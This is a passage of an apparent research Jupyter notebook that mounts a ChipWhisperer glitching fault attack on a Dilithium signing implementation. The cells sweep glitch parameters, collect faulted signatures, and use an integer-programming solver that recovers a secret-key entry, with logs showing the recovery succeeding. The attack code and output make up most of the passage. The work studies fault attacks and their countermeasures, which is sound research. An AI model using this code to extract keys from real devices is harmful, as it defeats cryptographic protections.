     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "270c79b529a54fd59eac33db7bbfe013",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_52 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "92569f8dadeb4575af8c626bb858d9d8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_53 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e210dd2f839a4b72bec918748dc1e5e7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_54 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "329e48d1150c45ae94a9f2f57f14c24f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_55 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a66c7652a0a34c0e8e73d5ba86ef45db",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_56 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ef7dba18f6dc4de480e513902268e36b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_57 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b656ddc3949845bb92be3d5ff3cc6d2a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_58 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "58f39d923f224197a231042a87fa5d3c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_59 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2014b40c527d4138bda5fd69a5806719",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_60 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ab774b65e4474936b8b07a5912fd733f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_61 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "64ed8f1e572e4e2fae1604a5a5e957ef",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_62 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f31b1efb9c92429a8484b3f6a195fc01",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_63 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ef2507b71ee44143a532d25d39803de3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='success count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b674b418d62f46b8bffd1545e3cd2aa2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='reset count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c9427b6f14354be69e910115740f73aa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='normal count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0847e942963f456a95b234d702cba991",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "decb65a9d872475b840495f1be0a9cab",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d1e560a6877c451c84f8596b86660757",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='message setting:', disabled=True, max=10.0, reado…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import chipwhisperer.common.results.glitch as glitch\n",
    "MIN_ZEROS = 2 * d.n\n",
    "zeros = 0\n",
    "gc = glitch.GlitchController(groups=[f\"perfect_{i}\" for i in range(NUM_ITERS)] + [\"success\", \"reset\", \"normal\"], parameters=[\"width\", \"offset\", \"message\"])\n",
    "gc.display_stats()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "54fdf8fac1914e98b51e712980a87a9a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='zeros (max)', disabled=True)"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "zero_widget = widgets.IntText(value=0, description=\"zeros (max)\", disabled=True)\n",
    "zero_widget"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "sigs_faulted = []\n",
    "sigs_faulted_params = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b' \\x00@\\x04\\x00\\x00\\x00\\x0bb\\x07boot ok\\xc1\\x00'"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "gc.set_range(\"offset\", offset_start, offset_stop)\n",
    "gc.set_range(\"width\", width_start, width_stop)\n",
    "gc.set_range(\"message\", msg_start, msg_stop)\n",
    "gc.set_global_step(step)\n",
    "scope.glitch.repeat = repeat\n",
    "target.reboot_flush()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "def one_try(scope, target, gc, message_int, sigs_faulted: list, sigs_faulted_params: list) -> bool:\n",
    "    new_zeros = 0\n",
    "    param_tuple = (scope.glitch.width, scope.glitch.offset, message_int)\n",
    "    message = struct.pack('!H', message_int)\n",
    "    scope.arm()\n",
    "    try:\n",
    "        target.sign(message, TIMEOUT)\n",
    "        \n",
    "        trigger_timeout = scope.capture()\n",
    "        if trigger_timeout:\n",
    "            gc.add(\"reset\", param_tuple)\n",
    "            __LOGGER.info('fail due to trigger timeout')\n",
    "            target.reboot_flush()\n",
    "            return new_zeros\n",
    "        \n",
    "    except TargetTimeoutError as e:\n",
    "        gc.add(\"reset\", param_tuple)\n",
    "        __LOGGER.info(f'failed due to read timeout: {e}')\n",
    "        target.reboot_flush()\n",
    "        return new_zeros\n",
    "    except TargetIOError as e:\n",
    "        gc.add(\"reset\", param_tuple)\n",
    "        __LOGGER.info(f'failed due to TargetIOError error: {e}')\n",
    "        target.reboot_flush()\n",
    "        return new_zeros\n",
    "    else:\n",
    "        try:\n",
    "            sig_candidate_packed = target.get_sig()\n",
    "            _, z_candidate, _ = d._unpack_sig(sig_candidate_packed)\n",
    "            \n",
    "            if np.all(z_candidate == z_correct):\n",
    "                gc.add(\"normal\", param_tuple)\n",
    "                return new_zeros\n",
    "            i = get_iter(z_candidate[0])\n",
    "\n",
    "            if i == NUM_ITERS:\n",
    "                gc.add(\"success\", param_tuple)\n",
    "            elif 0 <= i < NUM_ITERS:\n",
    "                gc.add(f\"perfect_{i}\", param_tuple)\n",
    "                new_zeros = d.n - d._polyz_unpack_coeffs_per_iter * i\n",
    "            else:\n",
    "                __LOGGER.warning('Unexpected iteration!')\n",
    "            \n",
    "            __LOGGER.info(\"Glitched! Ext offset: {} Offset: {} Width: {} Message:{}\".format(scope.glitch.ext_offset, scope.glitch.offset, scope.glitch.width, message))\n",
    "            \n",
    "            sigs_faulted.append(sig_candidate_packed)\n",
    "            sigs_faulted_params.append(param_tuple)\n",
    "        except TargetIOError as e:\n",
    "            gc.add(\"reset\", param_tuple)\n",
    "            __LOGGER.info(f'Failed to read sig: {e}')\n",
    "            target.reboot_flush()\n",
    "    return new_zeros"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:sigglitches:Glitched! Ext offset: 51 Offset: 6.640625 Width: 6.640625 Message:b'\\x00\\x00'\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "INFO:sigglitches:Glitched! Ext offset: 51 Offset: 6.640625 Width: 6.640625 Message:b'\\x00\\x02'\n",
      "(ChipWhisperer Target WARNING|File SimpleSerial2.py:502) Read timed out: \n",
      "INFO:sigglitches:failed due to read timeout: Target cleanly timed out while generating a signature\n",
      "INFO:sigglitches:Glitched! Ext offset: 51 Offset: 6.640625 Width: 6.640625 Message:b'\\x00\\x04'\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total duration: 4.672922849655151s 0.07788204749425252min 0.0012980341249042087h\n"
     ]
    }
   ],
   "source": [
    "start_time = time.time()\n",
    "do_break = False\n",
    "for glitch_setting in gc.glitch_values():\n",
    "    scope.glitch.offset = glitch_setting[1]\n",
    "    scope.glitch.width = glitch_setting[0]\n",
    "    message = glitch_setting[2]\n",
    "    for i in glitch_spots:\n",
    "        scope.glitch.ext_offset = i\n",
    "        for j in range(redo + 1):\n",
    "            new_zeros = one_try(scope, target, gc, message, sigs_faulted, sigs_faulted_params)\n",
    "            zeros += new_zeros\n",
    "            zero_widget.value = zeros\n",
    "        if zeros > MIN_ZEROS:\n",
    "            do_break = True\n",
    "    if do_break:\n",
    "        break\n",
    "end_time = time.time()\n",
    "total_duration = end_time - start_time\n",
    "print(f'total duration: {total_duration}s {total_duration/60}min {total_duration/3600}h')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "result_data = {\n",
    "    \"sig_correct\": list(sig_correct),\n",
    "    \"glitch_spots\": list(glitch_spots),\n",
    "    \"width_start\": width_start,\n",
    "    \"width_stop\": width_stop,\n",
    "    \"offset_start\": offset_start,\n",
    "    \"offset_stop\": offset_stop,\n",
    "    \"repeat\": repeat,\n",
    "    \"redo\": redo,\n",
    "    \"repeat\": repeat,\n",
    "    \"step\": step,\n",
    "    \"sigs_faulted\": list(map(lambda s: list(s), sigs_faulted)),\n",
    "    \"sigs_faulted_param_descripton\": \"0 = ext_offset, 1 = offset, 2 = width\",\n",
    "    \"sigs_faulted_params\": sigs_faulted_params\n",
    "}\n",
    "with open(f'iter2{uuid.uuid4()}.json', 'w') as f:\n",
    "    json.dump(result_data, f)\n",
    "#json.dumps(result_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:root:Before filter: 768; after filter: 753; delta: 15; threshold: 78\n",
      "INFO:root:Total filtered: 753; true: 142387; false: -141634; false-positive rate: -18809.29614873838%; probability: nan\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Set parameter Username\n",
      "Academic license - for non-commercial use only - expires 2023-12-07\n",
      "Set parameter TimeLimit to value 60\n",
      "Set parameter Threads to value 4\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:root:Starting recovery of an entry. Will timeout after 60s. Current datetime is: 2022-12-14 02:16:55.337604\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Gurobi Optimizer version 10.0.0 build v10.0.0rc2 (linux64)\n",
      "\n",
      "CPU model: Intel(R) Core(TM) i7-6850K CPU @ 3.60GHz, instruction set [SSE2|AVX|AVX2]\n",
      "Thread count: 6 physical cores, 6 logical processors, using up to 4 threads\n",
      "\n",
      "Optimize a model with 1506 rows, 1009 columns and 60240 nonzeros\n",
      "Model fingerprint: 0x7f91e71b\n",
      "Variable types: 0 continuous, 1009 integer (753 binary)\n",
      "Coefficient statistics:\n",
      "  Matrix range     [1e+00, 1e+05]\n",
      "  Objective range  [1e+00, 1e+00]\n",
      "  Bounds range     [1e+00, 2e+00]\n",
      "  RHS range        [1e+05, 1e+05]\n",
      "Found heuristic solution: objective 8.0000000\n",
      "Presolve time: 0.04s\n",
      "Presolved: 1506 rows, 1009 columns, 60240 nonzeros\n",
      "Variable types: 0 continuous, 1009 integer (753 binary)\n",
      "Found heuristic solution: objective 41.0000000\n",
      "\n",
      "Root relaxation: objective 7.530000e+02, 674 iterations, 0.16 seconds (0.24 work units)\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:root:Candidate is correct with same sign\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    Nodes    |    Current Node    |     Objective Bounds      |     Work\n",
      " Expl Unexpl |  Obj  Depth IntInf | Incumbent    BestBd   Gap | It/Node Time\n",
      "\n",
      "*    0     0               0     753.0000000  753.00000  0.00%     -    0s\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:root:Candidate is correct with same sign\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Explored 1 nodes (674 simplex iterations) in 0.25 seconds (0.29 work units)\n",
      "Thread count was 4 (of 6 available processors)\n",
      "\n",
      "Solution count 3: 753 41 8 \n",
      "\n",
      "Solve interrupted\n",
      "Best objective 7.530000000000e+02, best bound 7.530000000000e+02, gap 0.0000%\n",
      "\n",
      "User-callback calls 184, time in user-callback 0.01 sec\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:root:We used 753.0 zero coefficients in y to recover the secret key.\n",
      "INFO:root:Recovery took 0.2575080394744873 seconds.\n",
      "INFO:root:Successfully recovered s_1 entry!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(array([ 0.,  1.,  2., -2., -1., -1., -2.,  2., -2.,  2.,  2., -1.,  2.,\n",
      "        1.,  0.,  2., -2.,  2.,  1., -1.,  0., -2.,  0.,  2.,  1., -1.,\n",
      "       -2., -1.,  0.,  1., -2.,  1.,  0.,  2.,  0.,  1.,  0.,  0., -2.,\n",
      "       -2., -2.,  1., -2.,  0.,  0., -2.,  0., -1., -2., -1.,  2.,  2.,\n",
      "        1.,  2.,  1.,  0.,  1., -2.,  0., -2.,  1., -2.,  1., -2., -2.,\n",
      "        2., -1.,  0., -2., -1.,  1.,  1.,  1.,  2., -2.,  1.,  0., -1.,\n",
      "        0.,  2.,  1.,  0.,  2.,  1.,  2., -1.,  2.,  1.,  2.,  0., -1.,\n",
      "       -1.,  2., -1., -1.,  1., -1.,  2., -1.,  1., -1.,  0., -1.,  1.,\n",
      "        0.,  0., -2.,  0.,  2.,  1.,  1.,  0.,  2., -1., -1.,  2.,  1.,\n",
      "        2.,  0., -1.,  1.,  0., -2.,  2., -2., -1., -2.,  1.,  0.,  0.,\n",
      "        0.,  0.,  1.,  1., -1., -1.,  2., -1.,  0.,  2., -1., -2.,  2.,\n",
      "        2.,  2., -1.,  0., -2.,  1.,  2.,  0.,  1.,  1.,  1.,  0., -1.,\n",
      "        2.,  0., -2., -2.,  1., -1.,  1.,  2., -1.,  0.,  2.,  0., -2.,\n",
      "       -1., -1.,  2.,  2.,  2., -1.,  0., -2.,  0.,  1., -1., -1.,  1.,\n",
      "        2., -2., -2., -2.,  1.,  1.,  0.,  0.,  0.,  0.,  1., -1.,  0.,\n",
      "        1.,  2., -1., -2., -1.,  0.,  2.,  1., -2.,  1., -2., -2., -2.,\n",
      "        0., -1., -1.,  1., -2.,  0.,  1.,  2., -2.,  1.,  1.,  1., -2.,\n",
      "        1., -2.,  0., -2.,  0.,  2.,  0., -1., -2.,  1., -2., -2., -2.,\n",
      "        0.,  2.,  1., -1.,  2.,  1.,  2., -2., -1., -2., -2., -1., -1.,\n",
      "        1., -1., -1., -2.,  0.,  0.,  2.,  1., -1.]), {<ResultKeys.FAULTED_COEFFS: 'faulted_coeffs'>: 142387, <ResultKeys.TOTAL_EQUATIONS: 'total_equations'>: 768, <ResultKeys.FILTERED_EQUATIONS: 'filtered_equations'>: 753, <ResultKeys.DURATION: 'duration'>: 0.2575080394744873, <ResultKeys.FAILURE: 'failure'>: False, <ResultKeys.EQUATIONS_USED: 'equations_used'>: 753.0})\n"
     ]
    }
   ],
   "source": [
    "sigs_faulted_unpacked = list(map(lambda sig_packed: d._unpack_sig_full(sig_packed), sigs_faulted))\n",
    "from dilithium_solver.signature import Signature, calculate_c_matrix_np\n",
    "from dilithium_solver.recover_s_1_entry import recover_s_1_entry\n",
    "from dilithium_solver.parameters import Parameters\n",
    "\n",
    "params = Parameters.get_nist_security_level(d.nist_security_level)\n",
    "\n",
    "sigs = list(map(\n",
    "    lambda sig_faulted: Signature(\n",
    "        sig_faulted[1],\n",
    "        sig_faulted[0],\n",
    "        calculate_c_matrix_np(sig_faulted[0], params)\n",
    "    ), sigs_faulted_unpacked))\n",
    "s_1_entry_index = 0\n",
    "\n",
    "# what was the sk again?\n",
    "d.pseudorandombytes_seed(b'attack-shuffling-countermeasure-keypair')\n",
    "pk, sk = d.keypair()\n",
    "\n",
    "s_1 = d._unpack_sk(sk)[4]\n",
    "timeout = 60\n",
    "threshold = d.beta\n",
    "for i in range(len(sigs_faulted_unpacked[0][1])): # long version of saying \"l\"\n",
    "    result = recover_s_1_entry(sigs, i, s_1, params, 142387, timeout, threshold) # this number is not relevant\n",
    "    print(result)\n",
    "    break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
